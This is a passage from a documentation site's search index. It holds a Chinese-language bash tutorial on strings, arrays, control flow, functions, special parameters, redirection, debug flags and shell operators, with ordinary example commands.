<code>${#array[*]}</code></li> </ul>"},{"location":"language/shell/grammar/#_4","title":"\u4e94\u3001\u8fd0\u7b97\u7b26","text":"<p>SHELL\uff1a\u8fd0\u7b97\u7b26</p>"},{"location":"language/shell/grammar/#_5","title":"\u516d\u3001\u5b57\u7b26\u4e32","text":"<p>shell \u5b57\u7b26\u4e32\u53ef\u4ee5\u7528\u5355\u5f15\u53f7 \u00a0<code>''</code>\uff0c\u4e5f\u53ef\u4ee5\u7528\u53cc\u5f15\u53f7 \u00a0<code>\u201c\u201d</code>\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u7528\u5f15\u53f7\u3002</p> <p>\u63a8\u8350\u4f7f\u7528\u53cc\u5f15\u53f7</p> <p>shell \u89c4\u5b9a \u5355\u5f15\u53f7\u7981\u6b62\u53d8\u91cf\u66ff\u6362\uff0c\u5143\u5b57\u7b26 $ \u548c * \u7b49\u4fdd\u6301\u5176\u7b26\u53f7\u672c\u8eab\uff0c\u800c\u53cc\u5f15\u53f7\u5141\u8bb8\u5143\u5b57\u7b26\u53d8\u91cf\u66ff\u6362\u3002</p> <pre><code>str=\"this is a string\"\n\n## \u62fc\u63a5\u5b57\u7b26\u4e32\nstr1=\"world\"\nstr2=\"hello, \"${str1}\"\"\n\n## \u83b7\u53d6\u5b57\u7b26\u4e32\u957f\u5ea6\necho ${#str}\n\n## \u622a\u53d6\u5b57\u7b26\u4e32\necho ${str:2:2}\n## Ooutput\uff1ais\uff0c\u4ece\u4e0b\u68072\u5f00\u59cb\uff0c\u53d62\u4e2a\u5b57\u7b26\u3002\n\n## \u67e5\u627e\u5b50\u5b57\u7b26\u4e32\ntext=\"hello\"\necho `expr index \"${text}\" ll`\n\n## Output\uff1a3\uff0c\u67e5\u627e ll \u5b50\u5b57\u7b26\u5728 hello \u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\n</code></pre>"},{"location":"language/shell/grammar/#_6","title":"\u4e03\u3001\u6570\u7ec4","text":"<p>bash \u53ea\u652f\u6301\u4e00\u7ef4\u6570\u7ec4\uff0c\u6570\u7ec4\u4e0b\u6807\u4ece 0 \u5f00\u59cb\u3002</p> <p>\u4f46\u662fzsh \u7684\u6570\u7ec4\u4e0b\u6807\u662f\u4ece 1 \u5f00\u59cb\u7684\uff0c\u5927\u90e8\u5206 shell \u7684\u6570\u7ec4\u4e0b\u6807\u90fd\u662f\u4ece 1 \u5f00\u59cb(e.g. Bourne, csh, tcsh, fish, rc, es, yash)\uff0c\u9664\u4e86 ksh\uff0c\u7531\u4e8e bash \u662f\u57fa\u4e8e ksh \u7684\uff0c\u56e0\u6b64\u5b83\u4e5f\u662f\u4ece 0 \u5f00\u59cb\u7684\u3002</p> <p>Shell\uff1azsh bash source ./\u6267\u884c\u811a\u672c\u7684\u533a\u522b</p> <pre><code>## \u521b\u5efa\u6570\u7ec4\u7684\u4e0d\u540c\u65b9\u5f0f\nnums=([2]=\"dark blue\" [0]=red [1]=yellow)\nnums=(red yellow \"dark blue\")\n\n## \u8bbf\u95ee\u6570\u7ec4\u7684\u4e0d\u540c\u65b9\u5f0f\necho ${nums[1]}\n\n## \u8bbf\u95ee\u6570\u7ec4\u7684\u6240\u6709\u5143\u7d20\necho ${nums[*]}\necho ${nums[@]}\n\n## \u8bbf\u95ee\u6570\u7ec4\u7684\u90e8\u5206\u5143\u7d20\uff1a\u4f8b\u5982\u53d6\u51fa\u6570\u7ec4\u4e2d\u4e0b\u68071\u5f00\u59cb\uff0c\u957f\u5ea6\u4e3a2\u7684\u5143\u7d20\uff08\u5373\u53d6\u4e24\u4e2a\u5143\u7d20\uff09\necho ${nums[*]:1:2}\n\n## \u8bbf\u95ee\u6570\u7ec4\u957f\u5ea6\necho ${#nums[*]}\n\n## \u5220\u9664\u6570\u7ec4\u5143\u7d20\uff0c\u5982\u4e0b\u5220\u9664\u6570\u7ec4\u4e0b\u68070\u7684\u5143\u7d20\uff0c\u6ce8\u610f\u5220\u9664\u540e\uff0cnums[0]=null\uff0cnums[1]\u7b49\u4e0d\u53d8\nunset nums[0]\n</code></pre>"},{"location":"language/shell/grammar/#_7","title":"\u516b\u3001\u63a7\u5236\u8bed\u53e5","text":"<p>\u672c\u6587\u4e2d\u90fd\u91c7\u7528 <code>[]</code> \u683c\u5f0f\uff0c\u800c\u4e0d\u662f <code>[[]]</code> \u683c\u5f0f</p>"},{"location":"language/shell/grammar/#81","title":"8.1 \u6761\u4ef6\u8bed\u53e5","text":"<p>Bash \u4e2d\u7684\u6761\u4ef6\u8bed\u53e5\u8ba9\u6211\u4eec\u53ef\u4ee5\u51b3\u5b9a\u4e00\u4e2a\u64cd\u4f5c\u662f\u5426\u88ab\u6267\u884c\u3002\u7ed3\u679c\u53d6\u51b3\u4e8e\u4e00\u4e2a\u5305\u5728<code>[[ ]]</code> \u6216 <code>[]</code> \u91cc\u7684\u8868\u8fbe\u5f0f\uff0c\u8be5\u8868\u8fbe\u5f0f\u88ab\u79f0\u4e3a <code>\u68c0\u6d4b\u547d\u4ee4</code> \u6216 <code>\u57fa\u5143</code> \uff0c\u8fd9\u4e9b\u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u662f <code>true|false</code> \u3002</p> <p>Shell\uff1a\u5355\u4e2d\u62ec\u53f7\u548c\u53cc\u4e2d\u62ec\u53f7\u7684\u533a\u522b</p> <p>\u6ce8\u610f\uff1a\u6761\u4ef6\u8868\u8fbe\u5f0f\u8981\u653e\u5728\u65b9\u62ec\u53f7\u4e4b\u95f4\uff0c\u5e76\u4e14\u8981\u6709\u7a7a\u683c\u3002</p> <p><code>[$a==$b]</code>\u00a0 \u662f\u9519\u8bef\u7684\uff0c\u5fc5\u987b\u5199\u6210 \u00a0<code>[ $a == $b ]</code></p>"},{"location":"language/shell/grammar/#if","title":"if","text":"<pre><code>if [ condition ]\nthen\n    command1\n    ...\n    commandN\nelif [ condition ]\n    command1\n    ...\n    commandN\nelse\n    command1\n    ...\n    commandN\nfi\n\n## \u5199\u6210\u4e00\u884c\uff08\u9002\u7528\u4e8e\u7ec8\u7aef\u547d\u4ee4\u63d0\u793a\u7b26\uff09\uff1a\nif [ condition ]; then command1;commandN; fi\nif [ $(ps -ef | grep -c \"ssh\") -gt 1 ]; then echo \"true\"; fi\n</code></pre>"},{"location":"language/shell/grammar/#case","title":"case","text":"<p>\u5982\u679c\u4f60\u9700\u8981\u9762\u5bf9\u5f88\u591a\u60c5\u51b5\uff0c\u5206\u522b\u8981\u91c7\u53d6\u4e0d\u540c\u7684\u63aa\u65bd\uff0c\u90a3\u4e48\u4f7f\u7528 <code>case</code> \u4f1a\u6bd4\u5d4c\u5957\u7684 <code>if</code> \u66f4\u6709\u7528\u3002</p> <pre><code>case ${value} in\n\"value1\")\n    command1\n    ...\n    commandN\n    ;;\n\"value2\")\n    command1\n    ...\n    commandN\n    ;;\n*)\n    command1\n    ...\n    commandN\n    ;;\nesac\n</code></pre> <p>\u53d6\u503c\u540e\u9762\u5fc5\u987b\u4e3a\u5355\u8bcd <code>in</code> \uff0c\u53d6\u503c\u53ef\u4ee5\u4e3a\u53d8\u91cf\u6216\u5e38\u6570\uff0c\u6bcf\u4e2a case \u7684\u7ed3\u675f\u6807\u8bb0\u4e3a <code>;;</code> \uff0c\u82e5\u65e0\u4e00\u5339\u914d\u6a21\u5f0f\uff0c\u4f7f\u7528\u661f\u53f7 <code>*</code> \u6355\u83b7\u8be5\u503c\u3002</p>"},{"location":"language/shell/grammar/#82","title":"8.2 \u5faa\u73af\u8bed\u53e5","text":""},{"location":"language/shell/grammar/#for","title":"for","text":"<pre><code>## \u5f62\u5f0f1\nfor var in value1 ... valueN\ndo\n    command1\n    ...\n    commandN\ndone\n\n## \u5f62\u5f0f2\nfor (( i = 0; i &lt; 10; i++ ))\ndo\n        echo $i\ndone\n\n## \u5199\u6210\u4e00\u884c\nfor var in value1 ... valueN; do command1;commandN done\n</code></pre>"},{"location":"language/shell/grammar/#while","title":"while","text":"<p>\u5f53 <code>condition=true</code> \u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\uff0c\u5426\u5219\u9000\u51fa\u3002</p> <pre><code>while [ condition ]\ndo\n    command1\n    ...\n    commandN\ndone\n</code></pre>"},{"location":"language/shell/grammar/#until","title":"until","text":"<p>\u4e0e <code>while</code> \u76f8\u53cd\uff0c\u5f53 <code>condition=false</code> \u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\uff0c\u5426\u5219\u9000\u51fa\u3002</p> <pre><code>until [ condition ]\ndo\n    command1\n    ...\n    commandN\ndone\n</code></pre>"},{"location":"language/shell/grammar/#83-break-continue","title":"8.3 break \u548c continue","text":"<p>\u548c\u5176\u4ed6\u8bed\u8a00\u4e00\u6837\uff0c\u5355\u72ec\u4f7f\u7528\uff1a</p> <ul> <li><code>break;</code> \uff1a\u9000\u51fa\u5faa\u73af</li> <li><code>continue;</code> \uff1a\u8df3\u8fc7\u672c\u6b21\u5faa\u73af\u8fed\u4ee3</li> </ul>"},{"location":"language/shell/grammar/#_8","title":"\u4e5d\u3001\u51fd\u6570","text":""},{"location":"language/shell/grammar/#_9","title":"\u5b9a\u4e49\u53ca\u8c03\u7528","text":"<p>linux shell \u53ef\u4ee5\u7528\u6237\u5b9a\u4e49\u51fd\u6570\uff0c\u7136\u540e\u5728 shell \u811a\u672c\u4e2d\u53ef\u4ee5\u968f\u4fbf\u8c03\u7528\uff0c\u6ce8\u610f\uff0c\u8bf7\u5c06\u51fd\u6570\u653e\u5728\u811a\u672c\u6700\u524d\u9762\uff0c\u5426\u5219\u65e0\u6cd5\u8c03\u7528\uff01</p> <p>shell \u4e2d\u51fd\u6570\u7684\u5b9a\u4e49\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>function func_name(){\n    ## statements\n    return int\n}\n</code></pre> <ul> <li>\u683c\u5f0f\u7701\u7565</li> <li>function \u5b58\u5728\u65f6\uff0c()\u53ef\u4ee5\u7701\u7565\uff1a <code>function func_name{}</code></li> <li>function \u7701\u7565\u65f6\uff0c()\u4e0d\u53ef\u7701\u7565\uff1a <code>fucn_name(){}</code> \uff0c\u5efa\u8bae\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\uff01</li> <li>\u51fd\u6570\u8fd4\u56de\u503c</li> <li>\u53ea\u80fd\u8fd4\u56de 0~255 \u7684\u6574\u5f62\u6570\u5b57\uff0c\u8d85\u8fc7\u5219\u505a\u9664\u4f59%\u7b97\u6cd5(e.g. 256\u21921)\u30020 \u8868\u793a\u6b63\u786e\uff0c\u5176\u4f59\u9519\u8bef\u3002</li> <li>\u82e5\u4e0d\u52a0 return \u8bed\u53e5\uff0cshell \u9ed8\u8ba4\u5c06\u4ee5\u6700\u540e\u4e00\u6761\u547d\u4ee4\u7684\u8fd0\u884c\u7ed3\u679c\u4f5c\u4e3a\u51fd\u6570\u8fd4\u56de\u503c</li> </ul> <p>\u51fd\u6570\u8c03\u7528\uff1a</p> <pre><code>## \u4e0d\u4f20\u9012\u53c2\u6570\uff0c\u76f4\u63a5\u7ed9\u51fa\u51fd\u6570\u540d\u5373\u53ef\nfunc_name\n\n## \u4f20\u9012\u53c2\u6570\uff0c\u591a\u4e2a\u53c2\u6570\u4e4b\u95f4\u4ee5\u7a7a\u683c\u5206\u9694\nfunc_name param1 param2 ... paramN\n</code></pre>"},{"location":"language/shell/grammar/#_10","title":"\u7279\u6b8a\u53c2\u6570","text":"\u53c2\u6570\u5904\u7406 \u8bf4\u660e $0 \u5f53\u524d shell \u7a0b\u5e8f\u7684\u540d\u5b57 $n(n&gt;10) \u7b2c n \u4e2a\u53c2\u6570\u503c $FUNCNAME \u51fd\u6570\u540d\u79f0\uff08\u4ec5\u5728\u51fd\u6570\u5185\u90e8\u6709\u503c\uff09 $## \u4f20\u9012\u5230\u811a\u672c\u6216\u51fd\u6570\u7684\u53c2\u6570\u4e2a\u6570 $* \u5206\u522b\u7528\u53cc\u5f15\u53f7\u5f15\u7528\u6240\u6709\u53c2\u6570 $@ \u4e0e$*\u76f8\u540c\uff0c\u4f46\u662f\u4f7f\u7528\u65f6\u52a0\u5f15\u53f7\uff0c\u5e76\u5728\u5f15\u53f7\u4e2d\u8fd4\u56de\u6bcf\u4e2a\u53c2\u6570\u3002 $? \u663e\u793a\u6700\u540e\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u30020 \u8868\u793a\u6ca1\u6709\u9519\u8bef\uff0c\u5176\u4ed6\u4efb\u4f55\u503c\u8868\u660e\u6709\u9519\u8bef\u3002 $- \u663e\u793a Shell \u4f7f\u7528\u7684\u5f53\u524d\u9009\u9879\uff0c\u4e0e set \u547d\u4ee4\u529f\u80fd\u76f8\u540c\u3002 $! \u540e\u53f0\u8fd0\u884c\u7684\u6700\u540e\u4e00\u4e2a\u8fdb\u7a0b\u7684 ID \u53f7 $$ \u5bf9\u4e8e\u4efb\u4f55\u811a\u672c\uff0c\u5728\u8fd0\u884c\u65f6\uff0c\u5b83\u5c06\u53ea\u6709\u4e00\u4e2a\u201c\u4e3b\u201d\u8fdb\u7a0b ID\uff0c\u4e0d\u8bba\u8c03\u7528\u591a\u5c11\u4e2a\u5b50 shell\uff0c$$\u90fd\u5c06\u8fd4\u56de\u4e0e\u8be5\u811a\u672c\u5173\u8054\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b ID $BASHPID bash \u5f53\u524d\u5b9e\u4f8b\u7684\u8fdb\u7a0b ID"},{"location":"language/shell/grammar/#_11","title":"\u5341\u3001\u6d41\u548c\u91cd\u5b9a\u5411","text":"<p>\u4f7f\u7528 <code>\u6d41</code>\uff0c\u6211\u4eec\u80fd\u5c06\u4e00\u4e2a\u7a0b\u5e8f\u7684\u8f93\u51fa\u53d1\u9001\u5230\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u6587\u4ef6\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u80fd\u65b9\u4fbf\u5730\u8bb0\u5f55\u65e5\u5fd7\u7b49\u3002</p> <p><code>\u7ba1\u9053</code> \u7ed9\u4e86\u6211\u4eec\u521b\u5efa\u4f20\u9001\u5e26\u7684\u673a\u4f1a\uff0c\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6210\u4e3a\u53ef\u80fd\u3002</p> <p>\u4e09\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a</p> \u4ee3\u7801 \u63cf\u8ff0\u7b26 \u63cf\u8ff0 0 stdin \u6807\u51c6\u8f93\u5165 1 stdout \u6807\u51c6\u8f93\u51fa 2 stderr \u6807\u51c6\u9519\u8bef\u8f93\u51fa <p>\u91cd\u5b9a\u5411\uff1a</p> <ul> <li><code>1&gt;</code> \u4e3a\u6807\u51c6\u8f93\u51fa\u91cd\u5b9a\u5411\uff0c\u53ef\u4ee5\u7f29\u5199\u4e3a <code>&gt;</code></li> <li>\u540c\u7406\uff0c <code>2&gt;</code> \u4e3a\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411</li> <li><code>&gt;&gt;</code> \u548c <code>&gt;</code> \u7684\u533a\u522b\u5728\u4e8e\uff0c<code>&gt;&gt;</code> \u662f\u5728\u6587\u4ef6\u540e\u8ffd\u52a0\uff0c\u800c <code>&gt;</code> \u4f1a\u8986\u76d6\u539f\u5185\u5bb9</li> </ul> <pre><code>## 1. \u4ec0\u4e48\u662f\u6807\u51c6\u8f93\u51fa\u3001\u6807\u51c6\u9519\u8bef\uff1f\n$ ls\na.txt\n\n$ ls a.txt b.txt\nls: cannot access 'b.txt': No such file or directory ## \u6807\u51c6\u9519\u8bef\na.txt ## \u6807\u51c6\u8f93\u51fa\n\n## 2. \u91cd\u5b9a\u5411\n$ ls a.txt b.txt 1&gt;file.out 2&gt;file.error ## \u6267\u884c\u540e\u6ca1\u6709\u8f93\u51fa\uff0c\u521b\u5efa\u4e86\u4e24\u4e2a\u6587\u4ef6\n\n$ cat file.out\na.txt\n\n$ cat file.error\nls: cannot access 'b.txt': No such file or directory\n</code></pre> <p>\u7406\u89e3\u6807\u51c6\u8f93\u51fa\u3001\u6807\u51c6\u9519\u8bef\u548c\u91cd\u5b9a\u5411\u4e4b\u540e\uff0c\u8fdb\u4e00\u6b65\u6df1\u5165\uff1a</p> <ul> <li><code>2&gt;&amp;1</code> \u5c06 <code>\u6807\u51c6\u9519\u8bef</code> \u91cd\u5b9a\u5411\u5230 <code>\u6807\u51c6\u8f93\u51fa</code>\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5408\u5e76\uff01</li> <li>\u540c\u7406\uff0c <code>1&gt;&amp;2</code> \u5c06 <code>\u6807\u51c6\u8f93\u51fa</code> \u91cd\u5b9a\u5411\u5230 <code>\u6807\u51c6\u9519\u8bef</code></li> <li><code>&amp;&gt;</code> \u5c06\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u540c\u65f6\u91cd\u5b9a\u5411\uff0c <code>&amp;&gt;file_name</code> \u8868\u793a\u540c\u65f6\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u7b49\u540c\u4e8e\uff1a <code>1&gt;file_name 2&gt;&amp;1</code> \u6216 <code>2&gt;file_name 1&gt;&amp;2</code></li> <li>\u6ce8\u610f\uff0c\u4e3a\u4ec0\u4e48\u5fc5\u987b\u6dfb\u52a0 <code>&amp;</code> \u7b26\u53f7\u5462\uff0c\u56e0\u4e3a <code>2&gt;1</code> \u65f6\uff0c\u4f1a\u628a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u5230\u6587\u4ef6\u540d\u4e3a 1 \u7684\u6587\u4ef6\u4e2d\uff01</li> </ul> <p>\u8f93\u51fa\u4e0d\u4ec5\u4ec5\u53ea\u6709\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u4e24\u79cd\uff0c\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u7c7b\u578b\uff0c\u6bd4\u5982\uff1a</p> <ul> <li><code>/dev/null</code> \u6587\u4ef6\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u5199\u5165\u5230\u5b83\u7684\u5185\u5bb9\u90fd\u4f1a\u88ab\u4e22\u5f03\uff0c\u4e5f\u65e0\u6cd5\u4ece\u4e2d\u8bfb\u53d6\u5185\u5bb9\u3002\u5176\u4e3b\u8981\u7528\u5904\u662f <code>\u7981\u6b62\u8f93\u51fa</code> \u3002</li> </ul>"},{"location":"language/shell/grammar/#debug","title":"\u5341\u4e00\u3001Debug","text":"<p>shell \u63d0\u4f9b\u4e86\u4e00\u4e9b\u7528\u4e8e\u8c03\u8bd5\u811a\u672c\u7684\u9009\u9879\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> Short Name Description -f noglob \u7981\u6b62\u6a21\u5f0f\u6269\u5c55\uff08globbing\uff09\uff0c\u5982~\u4f1a\u81ea\u52a8\u6269\u5c55\u4e3a\u5bb6\u76ee\u5f55 -i interactive \u8ba9\u811a\u672c\u4ee5 \u00a0 \u4ea4\u4e92 \u00a0 \u6a21\u5f0f\u8fd0\u884c -x xtrace \u5728\u6267\u884c\u6bcf\u6761\u547d\u4ee4\u524d\uff0c\u5411 stderr \u8f93\u51fa\u8be5\u547d\u4ee4\u4ee5\u53ca\u8be5\u547d\u4ee4\u7684\u6269\u5c55\u53c2\u6570 -v verbose \u5728\u6267\u884c\u6bcf\u6761\u547d\u4ee4\u524d\uff0c\u5411 stderr \u8f93\u51fa\u8be5\u547d\u4ee4 -t \u2014 \u6267\u884c\u5b8c\u7b2c\u4e00\u6761\u547d\u4ee4\u540e\u9000\u51fa -n noexec \u8bfb\u53d6\u547d\u4ee4\uff0c\u4f46\u4e0d\u6267\u884c\uff08\u8bed\u6cd5\u68c0\u67e5\uff09 <p>\u4f7f\u7528\u8fd9\u4e9b\u9009\u9879\u6709\u4e09\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>\u547d\u4ee4\u884c\u63d0\u4f9b\u53c2\u6570\uff1a <code>$ sh -x ./shell_script.sh</code></li> <li>\u811a\u672c\u5f00\u5934\u63d0\u4f9b\u53c2\u6570\uff1a <code>/usr/bin/env bash -x</code></li> <li>\u5728\u811a\u672c\u4e2d\u7528 set \u547d\u4ee4\u542f\u7528\u6216\u7981\u7528\u53c2\u6570\uff1a</li> </ul> <pre><code>#! /usr/bin/env bash\nif [ -z \"$1\" ]; then\n  set -x\n  echo \"ERROR: Insufficient Args.\"\n  exit 1\n  set +x\nfi\n</code></pre>"},{"location":"language/shell/grammar/#_12","title":"\u5341\u4e8c\u3001\u547d\u4ee4","text":"<ul> <li>echo</li> <li>printf</li> <li>grep</li> <li>test</li> <li>cat</li> </ul>"},{"location":"language/shell/grammar/#references","title":"References","text":"<ul> <li>\u4e00\u6587\u638c\u63e1 shell \u8bed\u8a00 - \u535a\u5ba2\u56ed</li> <li>Shell \u6559\u7a0b - C \u8bed\u8a00\u4e2d\u6587\u7f51</li> <li>Bash \u811a\u672c\u6559\u7a0b - \u5ed6\u96ea\u5cf0</li> <li>bash-handbook-zh-CN</li> <li>Linux Tools Quick Tutorial</li> </ul>"},{"location":"language/shell/operator/","title":"Shell\uff1a\u8fd0\u7b97\u7b26","text":""},{"location":"language/shell/operator/#_1","title":"\u7b97\u6570\u8fd0\u7b97\u7b26","text":"\u8fd0\u7b97\u7b26 \u8bf4\u660e + \u52a0\u6cd5 - \u51cf\u6cd5 != \u4e0d\u76f8\u7b49\u3002\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u6570\u5b57\uff0c\u4e0d\u76f8\u540c\u5219\u8fd4\u56de true\u3002 == \u76f8\u7b49\u3002\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u6570\u5b57\uff0c\u76f8\u540c\u5219\u8fd4\u56de true\u3002 = \u8d4b\u503c % \u53d6\u4f59 / \u9664\u6cd5 * \u4e58\u6cd5 <p>\u539f\u751f bash \u4e0d\u652f\u6301\u6570\u5b66\u8fd0\u7b97\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u5176\u4ed6\u547d\u4ee4\u6765\u5b9e\u73b0\uff1a</p> <ul> <li>let</li> <li>[]</li> <li>(())</li> <li>expr</li> <li>awk</li> <li>bc</li> </ul> <p>Reference</p> <ul> <li>\u5ed6\u96ea\u5cf0 | Bash \u811a\u672c\u6559\u7a0b</li> </ul> <p>expr \u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u4e09\u70b9\uff1a</p> <ul> <li>\u9664\u8d4b\u503c\u5916\uff0c\u5176\u4f59 \u8fd0\u7b97\u7b26\u548c\u53c2\u6570\u4e4b\u95f4 \u9700\u8981\u6709\u7a7a\u683c</li> <li>\u5b8c\u6574\u7684\u8868\u8fbe\u5f0f\u8981\u88ab\u53cd\u5f15\u53f7 \u00a0\u00a0 \u5305\u542b\uff0c\u6ce8\u610f\u8fd9\u4e2a\u5b57\u7b26\u4e0d\u662f\u5e38\u7528\u7684\u5355\u5f15\u53f7\uff0c\u5728 Esc \u952e\u4e0b\u65b9</li> <li>\u4e58\u6cd5\u8fd0\u884c\u7b97\u7b26*\u9700\u8981\u8f6c\u4e49\u4f7f\u7528\uff1a <code>\\*</code></li> </ul> <pre><code>x=20\ny=10\n\nval=`expr ${x} + ${y}`\nval=`expr ${x} \\* ${y}` ## \u4e58\u6cd5\u8fd0\u7b97\u7b26*\u9700\u8981\u8f6c\u4e49\u624d\u80fd\u4f7f\u7528\n</code></pre>"},{"location":"language/shell/operator/#_2","title":"\u5173\u7cfb\u8fd0\u7b97\u7b26","text":"\u8fd0\u7b97\u7b26 \u8bf4\u660e -eq \u68c0\u6d4b\u4e24\u4e2a\u6570\u662f\u5426\u76f8\u7b49\uff0c\u76f8\u7b49\u8fd4\u56de true\u3002\u7b49\u4e8e\u7b97\u6570\u8fd0\u7b97\u7b26\uff1a == -ne \u68c0\u6d4b\u4e24\u4e2a\u6570\u662f\u5426\u76f8\u7b49\uff0c\u4e0d\u76f8\u7b49\u8fd4\u56de true\u3002\u7b49\u4e8e\u7b97\u6570\u8fd0\u7b97\u7b26\uff1a != -le less than or equal \u68c0\u6d4b\u5de6\u8fb9\u7684\u6570\u662f\u5426 \u2264 \u5c0f\u4e8e\u7b49\u4e8e\u53f3\u8fb9\u7684\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -ge greater than or equal \u68c0\u6d4b\u5de6\u8fb9\u7684\u6570\u662f\u5426 \u2265 \u5927\u4e8e\u7b49\u4e8e\u53f3\u8fb9\u7684\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -lt less than \u68c0\u6d4b\u5de6\u8fb9\u7684\u6570\u662f\u5426 \uff1c \u5c0f\u4e8e\u53f3\u8fb9\u7684\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 -gt greater than \u68c0\u6d4b\u5de6\u8fb9\u7684\u6570\u662f\u5426 \uff1e \u5927\u4e8e\u53f3\u8fb9\u7684\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fd4\u56de true\u3002 <p>\u8fd0\u7b97\u7b26\u548c\u53c2\u6570\u4e4b\u95f4 \u9700\u8981\u6709\u7a7a\u683c!</p> <p>\u4f7f\u7528 <code>[[]]</code>\u6761\u4ef6\u5224\u65ad\u7ed3\u6784\uff0c\u800c\u4e0d\u662f <code>[]</code>\uff0c\u80fd\u591f\u9632\u6b62\u811a\u672c\u4e2d\u7684\u8bb8\u591a\u903b\u8f91\u9519\u8bef\u3002</p> <p>\u6bd4\u5982\uff0c <code>&amp;&amp;\u3001||\u3001&lt;\u548c&gt;</code> \u64cd\u4f5c\u7b26\u80fd\u591f\u6b63\u5e38\u5b58\u5728\u4e8e <code>[[]]</code> \u6761\u4ef6\u5224\u65ad\u7ed3\u6784\u4e2d\uff0c\u4f46\u662f\u5982\u679c\u51fa\u73b0\u5728 <code>[]</code> \u7ed3\u6784\u4e2d\u7684\u8bdd\uff0c\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a</p> <ul> <li>\u5f53\u4f7f\u7528<code>[]</code> \u6765\u64cd\u4f5c <code>&amp;&amp;\u3001||</code>\u65f6\uff0c\u9700\u8981\u5c06\u5176\u653e\u5728\u4e24\u4e2a <code>[]</code> \u4e4b\u95f4\uff1a <code>[ expr1 ] &amp;&amp; [ expr ]</code> \uff0c\u4f46\u662f\u4f7f\u7528 <code>[[]]</code> \u6765\u64cd\u4f5c\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff1a <code>[[ expr1 &amp;&amp; expr2 ]]</code> \u3002</li> <li><code>[[]]</code> \u4e0d\u53ef\u4ee5\u4f7f\u7528 <code>-o\u3001-a</code> \u8fd0\u7b97\u7b26\uff0c\u800c <code>[]</code> \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>-o\u3001-a</code> \u4ee3\u66ff <code>&amp;&amp;\u3001||</code> \uff0c\u4f8b\u5982\uff1a <code>[ expr -a expr ]</code></li> <li>\u4e0d\u53ef\u4ee5\u4f7f\u7528 <code>[]</code> \u6765\u64cd\u4f5c <code>&lt;\u3001&gt;</code>\uff0c\u9700\u8981\u4f7f\u7528 <code>-lt\u3001-gt</code> \u6765\u4ee3\u66ff\u3002 \u6ce8\u610f\uff1a <code>-le\u3001-ge</code> \u8fd9\u4e24\u4e2a\u8fd0\u7b97\u7b26 \u65e0\u6cd5 \u4f7f\u7528 <code>&lt;=\u3001&gt;=</code> \u4ee3\u66ff\uff01</li> <li>\u5728 <code>[]</code> \u4e2d\uff0c <code>-eq\u3001-ne</code> \u53ef\u4ee5\u7528 <code>=\u3001!=</code> \u6765\u4ee3\u66ff\u3002</li> </ul> <pre><code>## \u4ee5\u4e0b\u4e09\u79cd\u7528\u6cd5\u5b9e\u73b0\u7684\u529f\u80fd\u76f8\u540c\uff01\nif [[ $a != 1 &amp;&amp; $b != 2 ]]\nif [ $a -ne 1] &amp;&amp; [ $a != 2 ]\nif [ $a -ne 1 -a $a != 2 ]\u3002\n</code></pre>"},{"location":"language/shell/operator/#_3","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"\u8fd0\u7b97\u7b26 \u8bf4\u660e ! \u975e\u8fd0\u7b97\uff0c\u8868\u8fbe\u5f0f\u4e3a true \u5219\u8fd4\u56de false\uff0c\u5426\u5219\u8fd4\u56de true\u3002 -o \u6216\u8fd0\u7b97\uff0c\u6709\u4e00\u4e2a\u8868\u8fbe\u5f0f\u4e3a true \u5219\u8fd4\u56de true\u3002 || \u6216\u8fd0\u7b97\uff0c\u53ef\u4ee5\u77ed\u8def\u8fd0\u7b97\uff0c[[]]\u53ef\u7528 -a \u4e0e\u8fd0\u7b97\uff0c\u4e24\u4e2a\u8868\u8fbe\u5f0f\u90fd\u4e3a true \u624d\u8fd4\u56de true\u3002 &amp;&amp; \u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u77ed\u8def\u8fd0\u7b97\uff0c[[]]\u53ef\u7528"},{"location":"language/shell/operator/#_4","title":"\u5b57\u7b26\u4e32\u8fd0\u7b97\u7b26","text":"\u8fd0\u7b97\u7b26 \u8bf4\u660e = \u68c0\u6d4b\u4e24\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u76f8\u7b49\uff0c\u76f8\u7b49\u8fd4\u56de true\u3002 != \u68c0\u6d4b\u4e24\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u4e0d\u76f8\u7b49\uff0c\u4e0d\u76f8\u7b49\u8fd4\u56de true\u3002 $ 